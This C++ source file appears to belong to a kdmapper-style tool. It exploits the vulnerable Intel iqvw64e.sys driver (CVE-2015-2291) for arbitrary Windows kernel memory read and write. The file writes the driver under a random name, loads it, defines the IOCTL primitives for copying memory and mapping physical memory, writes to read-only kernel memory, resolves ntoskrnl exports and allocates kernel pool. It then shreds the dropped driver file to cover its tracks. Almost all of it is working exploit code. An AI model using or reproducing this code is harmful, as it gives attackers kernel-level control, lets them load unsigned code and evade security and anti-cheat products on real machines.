#include "intel_driver.hpp"
#include "service.hpp"
#include "intel_driver_resource.hpp"
#include <iostream>
#include <string>
#include <vector>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <fstream>

extern "C" {
	typedef LONG(NTAPI* PFN_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

	// SEH helper for CallKernelFunction template.  Must be a plain extern "C"
	// function with no C++ objects with non-trivial dtors so MSVC permits
	// __try/__except inside (avoids error C2712).
	uint64_t CKF_SEH_Call(
		uint64_t(__stdcall* fn)(uint64_t, uint64_t, uint64_t, uint64_t),
		uint64_t a0, uint64_t a1, uint64_t a2, uint64_t a3, int* out_except)
	{
		uint64_t rax = 0;
		__try {
			rax = fn(a0, a1, a2, a3);
			if (out_except) *out_except = 0;
		} __except (EXCEPTION_EXECUTE_HANDLER) {
			rax = 0;
			if (out_except) *out_except = (int)GetExceptionCode();
		}
		return rax;
	}
}

namespace intel_driver
{
	HANDLE g_hDevice = nullptr;
	uint64_t g_ntoskrnlAddr = 0;

	static std::string g_cachedServiceName;
	static std::wstring g_cachedDriverPath;

	// ----------------------------------------------------------------
	// IOCTL structs (matches iqvw64e.sys / CVE-2015-2291 exactly)
	// ----------------------------------------------------------------
	typedef struct _COPY_MEMORY_BUFFER_INFO {
		uint64_t case_number;
		uint64_t reserved;
		uint64_t source;
		uint64_t destination;
		uint64_t length;
	} COPY_MEMORY_BUFFER_INFO;

	typedef struct _FILL_MEMORY_BUFFER_INFO {
		uint64_t case_number;
		uint64_t reserved1;
		uint32_t value;
		uint32_t reserved2;
		uint64_t destination;
		uint64_t length;
	} FILL_MEMORY_BUFFER_INFO;

	typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_physical_address;
		uint64_t address_to_translate;
	} GET_PHYS_ADDRESS_BUFFER_INFO;

	typedef struct _MAP_IO_SPACE_BUFFER_INFO {
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_value;
		uint64_t return_virtual_address;
		uint64_t physical_address_to_map;
		uint32_t size;
	} MAP_IO_SPACE_BUFFER_INFO;

	typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
		uint64_t case_number;
		uint64_t reserved1;
		uint64_t reserved2;
		uint64_t virt_address;
		uint64_t reserved3;
		uint32_t number_of_bytes;
	} UNMAP_IO_SPACE_BUFFER_INFO;

	// ----------------------------------------------------------------
	// Helpers
	// ----------------------------------------------------------------
	static std::wstring Utf8ToWide(const std::string& s) {
		if (s.empty()) return L"";
		int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
		std::wstring w(n, 0);
		MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
		return w;
	}

	static std::string RandomAlphaNum(size_t len) {
		static const char* A = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
		std::string s; s.reserve(len);
		for (size_t i = 0; i < len; ++i) s += A[rand() % 52];
		return s;
	}

	static std::wstring GetDriverNameW() {
		if (g_cachedServiceName.empty()) g_cachedServiceName = RandomAlphaNum(16);
		return Utf8ToWide(g_cachedServiceName);
	}

	static std::wstring GetDriverPath() {
		if (g_cachedDriverPath.empty()) {
			wchar_t tmp[MAX_PATH] = {};
			GetTempPathW(MAX_PATH, tmp);
			std::wstring t(tmp);
			while (!t.empty() && (t.back() == L'\\' || t.back() == L'/')) t.pop_back();
			g_cachedDriverPath = t + L"\\" + GetDriverNameW() + L".sys";
		}
		return g_cachedDriverPath;
	}

	static bool IsDeviceAlive() {
		HANDLE h = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
			OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
		if (h && h != INVALID_HANDLE_VALUE) { CloseHandle(h); return true; }
		return false;
	}

	static NTSTATUS AcquireDebugPrivilege() {
		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (!ntdll) return STATUS_UNSUCCESSFUL;
		auto RtlAdjustPrivilege = (PFN_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
		if (!RtlAdjustPrivilege) return STATUS_UNSUCCESSFUL;
		BOOLEAN was = FALSE;
		return RtlAdjustPrivilege(20UL/*SeDebugPrivilege*/, TRUE, FALSE, &was);
	}

	static bool CollectIntelBlob(std::vector<uint8_t>* out, std::string* source_desc) {
		// Prefer external iqvw64e.sys next to the mapper (so users can swap it without rebuilding).
		std::wstring local = utils::GetExeDirW() + L"\\iqvw64e.sys";
		if (utils::ReadFileToMemory(local, out) && !out->empty()) {
			*source_desc = "external ./iqvw64e.sys (" + std::to_string(out->size()) + " bytes)";
			return true;
		}
		// Otherwise use embedded bytes (from bin/iqvw64e.sys via bat/embed_intel.bat).
		if (intel_driver_resource::driver_bytes_size > 0x200) {
			const uint8_t* p = intel_driver_resource::driver_bytes;
			const size_t   n = intel_driver_resource::driver_bytes_size;
			out->assign(p, p + n);
			*source_desc = "embedded iqvw64e.sys (" + std::to_string(n) + " bytes)";
			return true;
		}
		source_desc->clear();
		return false;
	}

	// ----------------------------------------------------------------
	// IOCTL primitives
	// ----------------------------------------------------------------
	bool MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
		if (!g_hDevice || g_hDevice == INVALID_HANDLE_VALUE || !destination || !source || !size) return false;
		COPY_MEMORY_BUFFER_INFO cbi{};
		cbi.case_number = 0x33;
		cbi.source = source;
		cbi.destination = destination;
		cbi.length = size;
		DWORD ret = 0;
		return DeviceIoControl(g_hDevice, 0x80862007, &cbi, sizeof(cbi), nullptr, 0, &ret, nullptr) != FALSE;
	}

	bool SetMemory(uint64_t address, uint32_t value, uint64_t size) {
		if (!g_hDevice || !address || !size) return false;
		FILL_MEMORY_BUFFER_INFO fbi{};
		fbi.case_number = 0x30;
		fbi.destination = address;
		fbi.value = value;
		fbi.length = size;
		DWORD ret = 0;
		return DeviceIoControl(g_hDevice, 0x80862007, &fbi, sizeof(fbi), nullptr, 0, &ret, nullptr) != FALSE;
	}

	bool GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address) {
		if (!g_hDevice || !address || !out_physical_address) return false;
		GET_PHYS_ADDRESS_BUFFER_INFO gp{};
		gp.case_number = 0x25;
		gp.address_to_translate = address;
		DWORD ret = 0;
		if (!DeviceIoControl(g_hDevice, 0x80862007, &gp, sizeof(gp), &gp, sizeof(gp), &ret, nullptr))
			return false;
		*out_physical_address = gp.return_physical_address;
		return *out_physical_address != 0;
	}

	uint64_t MapIoSpace(uint64_t physical_address, uint32_t size) {
		if (!g_hDevice || !physical_address || !size) return 0;
		MAP_IO_SPACE_BUFFER_INFO mbi{};
		mbi.case_number = 0x19;
		mbi.physical_address_to_map = physical_address;
		mbi.size = size;
		DWORD ret = 0;
		if (!DeviceIoControl(g_hDevice, 0x80862007, &mbi, sizeof(mbi), &mbi, sizeof(mbi), &ret, nullptr))
			return 0;
		return mbi.return_virtual_address;
	}

	bool UnmapIoSpace(uint64_t address, uint32_t size) {
		if (!g_hDevice || !address || !size) return false;
		UNMAP_IO_SPACE_BUFFER_INFO ubi{};
		ubi.case_number = 0x1A;
		ubi.virt_address = address;
		ubi.number_of_bytes = size;
		DWORD ret = 0;
		return DeviceIoControl(g_hDevice, 0x80862007, &ubi, sizeof(ubi), &ubi, sizeof(ubi), &ret, nullptr) != FALSE;
	}

	bool ReadMemory(uint64_t address, void* buffer, uint64_t size) {
		return MemCopy((uint64_t)buffer, address, size);
	}

	bool WriteMemory(uint64_t address, const void* buffer, uint64_t size) {
		return MemCopy(address, (uint64_t)buffer, size);
	}

	// ----------------------------------------------------------------
	// WriteToReadOnlyMemory (matches kdmapper/DragonBurn exactly):
	//   virt -> phys (GetPhysicalAddress) -> MapIoSpace -> MemCopy (IOCTL)
	//   through the mapped address -> UnmapIoSpace.
	//
	// We must NOT memcpy() directly into the mapped address from user mode --
	// the mapped VA is a kernel virtual address not directly accessible to us;
	// writes have to go through the driver's own MemCopy IOCTL.
	// ----------------------------------------------------------------
	bool WriteToReadOnlyMemory(uint64_t address, const void* buffer, uint32_t size) {
		if (!g_hDevice || !address || !buffer || !size) return false;

		uint64_t phys = 0;
		if (!GetPhysicalAddress(address, &phys)) {
			std::cout << "[-] WriteToReadOnlyMemory: GetPhysicalAddress failed for 0x"
				<< std::hex << address << std::dec << std::endl;
			return false;
		}
		uint64_t mv = MapIoSpace(phys, size);
		if (!mv) {
			std::cout << "[-] WriteToReadOnlyMemory: MapIoSpace failed for phys=0x"
				<< std::hex << phys << std::dec << std::endl;
			return false;
		}
		bool ok = WriteMemory(mv, buffer, size);
		if (!ok) {
			std::cout << "[-] WriteToReadOnlyMemory: WriteMemory(0x" << std::hex << mv
				<< " <- 0x" << (uint64_t)buffer << ", " << std::dec << size << ") failed" << std::endl;
		}
		if (!UnmapIoSpace(mv, size)) {
			std::cout << "[!] WriteToReadOnlyMemory: UnmapIoSpace failed" << std::endl;
		}
		return ok;
	}

	// ----------------------------------------------------------------
	// Kernel-side export resolver -- matches kdmapper exactly.
	// The entire export directory (IMAGE_EXPORT_DIRECTORY + name/ordinal/
	// function tables + name strings) is read as one contiguous blob into
	// a local buffer; "delta" converts kernel-space RVAs to local-buffer
	// pointers inside that blob.
	// ----------------------------------------------------------------
	uint64_t GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
		if (!kernel_module_base) return 0;

		IMAGE_DOS_HEADER dos{};
		if (!ReadMemory(kernel_module_base, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE)
			return 0;

		IMAGE_NT_HEADERS64 nt{};
		if (!ReadMemory(kernel_module_base + dos.e_lfanew, &nt, sizeof(nt)) || nt.Signature != IMAGE_NT_SIGNATURE)
			return 0;

		uint32_t export_rva  = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		uint32_t export_size = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
		if (!export_rva || !export_size) return 0;

		void* buf_local = VirtualAlloc(nullptr, export_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!buf_local) return 0;
		if (!ReadMemory(kernel_module_base + export_rva, buf_local, export_size)) {
			VirtualFree(buf_local, 0, MEM_RELEASE);
			return 0;
		}

		auto* export_dir = (PIMAGE_EXPORT_DIRECTORY)buf_local;
		const uint64_t delta = (uint64_t)buf_local - export_rva;

		auto* names = (uint32_t*)(export_dir->AddressOfNames + delta);
		auto* ords  = (uint16_t*)(export_dir->AddressOfNameOrdinals + delta);
		auto* funcs = (uint32_t*)(export_dir->AddressOfFunctions + delta);

		uint64_t result = 0;
		for (DWORD i = 0; i < export_dir->NumberOfNames; ++i) {
			const char* cur_name = (const char*)(names[i] + delta);
			if (_stricmp(cur_name, function_name.c_str()) != 0) continue;

			uint32_t func_rva = funcs[ords[i]];
			// Skip forwarded exports (RVA inside export dir).
			if (func_rva >= export_rva && func_rva < export_rva + export_size) break;
			result = kernel_module_base + func_rva;
			break;
		}
		VirtualFree(buf_local, 0, MEM_RELEASE);
		return result;
	}

	// ----------------------------------------------------------------
	// Load / Unload
	// ----------------------------------------------------------------
	HANDLE Load() {
		srand((unsigned)time(nullptr) ^ GetCurrentThreadId());

		if (IsDeviceAlive()) {
			HANDLE h = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
				OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
			if (h && h != INVALID_HANDLE_VALUE) {
				g_hDevice = h;
				g_ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
				std::cout << "[+] \\Device\\Nal already loaded, reusing handle" << std::endl;
				return h;
			}
		}

		if (!NT_SUCCESS(AcquireDebugPrivilege()))
			std::cout << "[!] AcquireDebugPrivilege failed, continuing..." << std::endl;

		utils::SetSystemPrivilege(L"SeDebugPrivilege", true);
		utils::SetSystemPrivilege(L"SeLoadDriverPrivilege", true);

		std::wstring driver_path = GetDriverPath();
		DeleteFileW(driver_path.c_str());

		std::vector<uint8_t> blob;
		std::string source_desc;
		if (!CollectIntelBlob(&blob, &source_desc)) {
			std::cout << "[-] Intel driver binary not found." << std::endl;
			return INVALID_HANDLE_VALUE;
		}
		std::cout << "[+] Using Intel driver: " << source_desc << std::endl;
		{
			// Print temp path as UTF-8 to avoid wcout/cout mixing issues.
			int needed = WideCharToMultiByte(CP_UTF8, 0, driver_path.c_str(), -1, nullptr, 0, nullptr, nullptr);
			std::string path_u8(needed > 0 ? needed - 1 : 0, '\0');
			if (needed > 1)
				WideCharToMultiByte(CP_UTF8, 0, driver_path.c_str(), -1, &path_u8[0], needed, nullptr, nullptr);
			std::cout << "[*] Driver temp path: " << path_u8 << std::endl;
		}

		if (blob.size() < 2 || blob[0] != 'M' || blob[1] != 'Z') {
			std::cout << "[-] Intel driver blob is not a valid PE (missing MZ)" << std::endl;
			return INVALID_HANDLE_VALUE;
		}

		if (!utils::CreateFileFromMemory(driver_path, (const char*)blob.data(), blob.size())) {
			int gle = (int)GetLastError();
			std::cout << "[-] Failed to write Intel driver to temp path"
				<< " (GetLastError=" << gle << ")" << std::endl;
			DeleteFileW(driver_path.c_str());
			return INVALID_HANDLE_VALUE;
		}

		NTSTATUS nt = service::RegisterAndStart(driver_path, GetDriverNameW());
		if (nt != STATUS_SUCCESS) {
			std::cout << "[-] NtLoadDriver failed with NTSTATUS=0x" << std::hex << nt << std::dec << std::endl;
			DeleteFileW(driver_path.c_str());
			return INVALID_HANDLE_VALUE;
		}
		std::cout << "[+] NtLoadDriver returned STATUS_SUCCESS" << std::endl;

		HANDLE h = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
			OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
		if (h == INVALID_HANDLE_VALUE || !h) {
			std::cout << "[-] CreateFile(\\\\Device\\\\Nal) failed (GLE=" << GetLastError() << ")" << std::endl;
			service::StopAndRemove(GetDriverNameW());
			DeleteFileW(driver_path.c_str());
			return INVALID_HANDLE_VALUE;
		}
		g_hDevice = h;
		std::cout << "[+] \\Device\\Nal handle opened: " << h << std::endl;

		g_ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
		if (!g_ntoskrnlAddr) {
			std::cout << "[-] Failed to find ntoskrnl.exe base" << std::endl;
			CloseHandle(h); g_hDevice = nullptr;
			service::StopAndRemove(GetDriverNameW());
			DeleteFileW(driver_path.c_str());
			return INVALID_HANDLE_VALUE;
		}
		std::cout << "[+] ntoskrnl.exe base = 0x" << std::hex << g_ntoskrnlAddr << std::dec << std::endl;

		// Sanity check: read ntoskrnl!MmHighestUserAddress (first bytes must be 'MZ')
		IMAGE_DOS_HEADER dos{};
		if (!ReadMemory(g_ntoskrnlAddr, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE) {
			std::cout << "[-] R/W through Nal failed (ntoskrnl MZ sanity read failed)" << std::endl;
			CloseHandle(h); g_hDevice = nullptr;
			service::StopAndRemove(GetDriverNameW());
			DeleteFileW(driver_path.c_str());
			return INVALID_HANDLE_VALUE;
		}
		std::cout << "[+] ntoskrnl MZ check passed." << std::endl;

		// Validate kernel-side resolver can find pool allocation/free exports.
		uint64_t ExAllocatePoolWithTag = GetKernelModuleExport(g_ntoskrnlAddr, "ExAllocatePoolWithTag");
		uint64_t ExAllocatePool        = GetKernelModuleExport(g_ntoskrnlAddr, "ExAllocatePool");
		uint64_t ExFreePool            = GetKernelModuleExport(g_ntoskrnlAddr, "ExFreePool");
		std::cout << "[*] Kernel exports -- ExAllocatePoolWithTag=0x" << std::hex
			<< ExAllocatePoolWithTag << " ExAllocatePool=0x" << ExAllocatePool
			<< " ExFreePool=0x" << ExFreePool << std::dec << std::endl;
		if ((!ExAllocatePoolWithTag && !ExAllocatePool) || !ExFreePool) {
			std::cout << "[-] Failed to resolve core pool exports" << std::endl;
			CloseHandle(h); g_hDevice = nullptr;
			service::StopAndRemove(GetDriverNameW());
			DeleteFileW(driver_path.c_str());
			return INVALID_HANDLE_VALUE;
		}

		return h;
	}

	bool Unload(HANDLE device_handle) {
		if (device_handle && device_handle != INVALID_HANDLE_VALUE) CloseHandle(device_handle);
		g_hDevice = nullptr;

		if (!g_cachedServiceName.empty()) {
			service::StopAndRemove(Utf8ToWide(g_cachedServiceName));
			g_cachedServiceName.clear();
		}
		if (!g_cachedDriverPath.empty()) {
			const std::wstring& dp = g_cachedDriverPath;
			// DragonBurn-style shred: overwrite with random data then delete.
			std::ofstream f(dp.c_str(), std::ios::out | std::ios::binary);
			if (f.is_open()) {
				int n = 4096 + (rand() % 8192);
				std::vector<char> junk(n);
				for (int i = 0; i < n; ++i) junk[i] = (char)(rand() & 0xFF);
				f.write(junk.data(), n);
				f.close();
			}
			_wremove(dp.c_str());
			g_cachedDriverPath.clear();
		}
		g_ntoskrnlAddr = 0;

		// Clean exit: erase the NtAddAtom backup so a reboot after a Windows
		// update does not risk restoring the wrong bytes.
		ckp::DeleteBackup();
		return true;
	}

	// ----------------------------------------------------------------
	// Pool allocation via kernel-side ExAllocatePoolWithTag(NonPagedPool, size, Tag)
	// Note: NonPagedPool == 0 on Win8+ is the executable pool type. We zero the
	// returned memory ourselves via WriteMemory + zero-page host buffer to avoid
	// relying on the FILL (case 0x30) IOCTL whose struct layout varies slightly
	// across builds of iqvw64e.sys.
	// ----------------------------------------------------------------
	uint64_t AllocatePool(uint32_t pool_type, uint64_t size) {
		if (!g_hDevice || !g_ntoskrnlAddr || !size) return 0;
		uint64_t fn = GetKernelModuleExport(g_ntoskrnlAddr, "ExAllocatePoolWithTag");
		if (!fn) {
			// Fallback to the non-tagged ExAllocatePool (older export).
			fn = GetKernelModuleExport(g_ntoskrnlAddr, "ExAllocatePool");
			if (!fn) { std::cout << "[-] AllocatePool: neither ExAllocatePoolWithTag nor ExAllocatePool found" << std::endl; return 0; }
			std::cout << "[*] Using fallback ExAllocatePool" << std::endl;
			uint64_t mem = 0;
			if (!CallKernelFunction<uint64_t>(&mem, fn, (uint64_t)pool_type, size, 0, 0)) {
				std::cout << "[-] CallKernelFunction(ExAllocatePool) failed" << std::endl;
				return 0;
			}
			return mem;
		}
		constexpr uint32_t tag = 'BwtE';
		uint64_t mem = 0;
		if (!CallKernelFunction<uint64_t>(&mem, fn, (uint64_t)pool_type, size, (uint64_t)tag, 0)) {
			std::cout << "[-] CallKernelFunction(ExAllocatePoolWithTag) failed" << std::endl;
			return 0;
		}
		return mem;
	}

	bool FreePool(uint64_t address) {
		if (!g_hDevice || !g_ntoskrnlAddr || !address) return false;
		uint64_t fn = GetKernelModuleExport(g_ntoskrnlAddr, "ExFreePool");
		if (!fn) return false;
		uint64_t junk = 0;
		return CallKernelFunction<uint64_t>(&junk, fn, address, 0, 0, 0);
	}
}
